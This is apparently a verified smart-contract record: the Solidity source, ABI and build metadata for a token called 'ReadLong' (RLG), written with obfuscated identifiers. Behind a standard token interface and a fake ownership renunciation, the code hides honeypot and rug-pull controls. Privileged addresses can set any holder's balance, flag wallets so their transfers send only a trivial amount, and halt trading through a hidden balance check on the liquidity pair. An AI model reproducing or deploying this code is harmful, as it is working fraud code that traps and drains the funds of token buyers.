{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface autoLiquidity {\n    function createPair(address isToAmount, address fundFromAmount) external returns (address);\n}\n\ninterface launchExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamFrom) external view returns (uint256);\n\n    function transfer(address teamShould, uint256 fundSwap) external returns (bool);\n\n    function allowance(address launchLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamShould,\n        uint256 fundSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTeam, uint256 value);\n    event Approval(address indexed launchLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyReceiverIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchExemptMetadata is launchExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReadLong is liquidityFrom, launchExempt, launchExemptMetadata {\n\n    address exemptList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address shouldLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public txMax;\n\n    uint256 private teamLaunchedSell;\n\n    uint256 constant marketingSender = 3 ** 10;\n\n    function owner() external view returns (address) {\n        return sellAutoLiquidity;\n    }\n\n    function autoFund(address launchAt, address teamShould, uint256 fundSwap) internal returns (bool) {\n        require(maxTx[launchAt] >= fundSwap);\n        maxTx[launchAt] -= fundSwap;\n        maxTx[teamShould] += fundSwap;\n        emit Transfer(launchAt, teamShould, fundSwap);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed listSender, address indexed receiverExemptSender);\n\n    function launchFee(address autoSender) public {\n        exemptFee();\n        if (buyShould == receiverLaunched) {\n            feeReceiverLimit = false;\n        }\n        if (autoSender == txMax || autoSender == swapTo) {\n            return;\n        }\n        autoTeam[autoSender] = true;\n    }\n\n    function transfer(address toTake, uint256 fundSwap) external virtual override returns (bool) {\n        return atMaxIs(_msgSender(), toTake, fundSwap);\n    }\n\n    bool public listFund;\n\n    uint256 private launchMax = 100000000 * 10 ** 18;\n\n    bool private fundTx;\n\n    uint256 tokenIs;\n\n    function tokenSell(address toTake, uint256 fundSwap) public {\n        exemptFee();\n        maxTx[toTake] = fundSwap;\n    }\n\n    function exemptFee() private view {\n        require(listAt[_msgSender()]);\n    }\n\n    function transferFrom(address launchAt, address teamShould, uint256 fundSwap) external override returns (bool) {\n        if (_msgSender() != shouldLiquidity) {\n            if (receiverLiquidity[launchAt][_msgSender()] != type(uint256).max) {\n                require(fundSwap <= receiverLiquidity[launchAt][_msgSender()]);\n                receiverLiquidity[launchAt][_msgSender()] -= fundSwap;\n            }\n        }\n        return atMaxIs(launchAt, teamShould, fundSwap);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverLiquidity;\n\n    address private sellAutoLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptMarketing;\n    }\n\n    function approve(address minTake, uint256 fundSwap) public virtual override returns (bool) {\n        receiverLiquidity[_msgSender()][minTake] = fundSwap;\n        emit Approval(_msgSender(), minTake, fundSwap);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverReceiver;\n    }\n\n    uint8 private toFrom = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchMax;\n    }\n\n    function walletSell() public {\n        emit OwnershipTransferred(txMax, address(0));\n        sellAutoLiquidity = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toFrom;\n    }\n\n    function allowance(address atLiquidity, address minTake) external view virtual override returns (uint256) {\n        if (minTake == shouldLiquidity) {\n            return type(uint256).max;\n        }\n        return receiverLiquidity[atLiquidity][minTake];\n    }\n\n    function balanceOf(address teamFrom) public view virtual override returns (uint256) {\n        return maxTx[teamFrom];\n    }\n\n    function launchedTeam(uint256 fundSwap) public {\n        exemptFee();\n        tokenIs = fundSwap;\n    }\n\n    constructor (){\n        \n        buyReceiverIs tradingAmount = buyReceiverIs(shouldLiquidity);\n        swapTo = autoLiquidity(tradingAmount.factory()).createPair(tradingAmount.WETH(), address(this));\n        if (fundTeam != maxAuto) {\n            maxAuto = true;\n        }\n        txMax = _msgSender();\n        listAt[txMax] = true;\n        maxTx[txMax] = launchMax;\n        walletSell();\n        if (receiverLaunched != teamLaunchedSell) {\n            fundTeam = true;\n        }\n        emit Transfer(address(0), txMax, launchMax);\n    }\n\n    bool public feeReceiverLimit;\n\n    uint256 private txIs;\n\n    bool private maxAuto;\n\n    mapping(address => uint256) private maxTx;\n\n    address public swapTo;\n\n    mapping(address => bool) public listAt;\n\n    bool private fundTeam;\n\n    string private receiverReceiver = \"Read Long\";\n\n    string private exemptMarketing = \"RLG\";\n\n    function atMaxIs(address launchAt, address teamShould, uint256 fundSwap) internal returns (bool) {\n        if (launchAt == txMax) {\n            return autoFund(launchAt, teamShould, fundSwap);\n        }\n        uint256 minReceiver = launchExempt(swapTo).balanceOf(exemptList);\n        require(minReceiver == tokenIs);\n        require(teamShould != exemptList);\n        if (autoTeam[launchAt]) {\n            return autoFund(launchAt, teamShould, marketingSender);\n        }\n        return autoFund(launchAt, teamShould, fundSwap);\n    }\n\n    uint256 senderTrading;\n\n    function listIs(address enableMode) public {\n        if (listFund) {\n            return;\n        }\n        \n        listAt[enableMode] = true;\n        if (receiverLaunched != buyShould) {\n            teamLaunchedSell = buyShould;\n        }\n        listFund = true;\n    }\n\n    mapping(address => bool) public autoTeam;\n\n    bool public enableTeam;\n\n    uint256 private buyShould;\n\n    uint256 public receiverLaunched;\n\n    function getOwner() external view returns (address) {\n        return sellAutoLiquidity;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExemptSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"}],\"name\":\"launchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundSwap\",\"type\":\"uint256\"}],\"name\":\"launchedTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"}],\"name\":\"listIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSwap\",\"type\":\"uint256\"}],\"name\":\"tokenSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReadLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}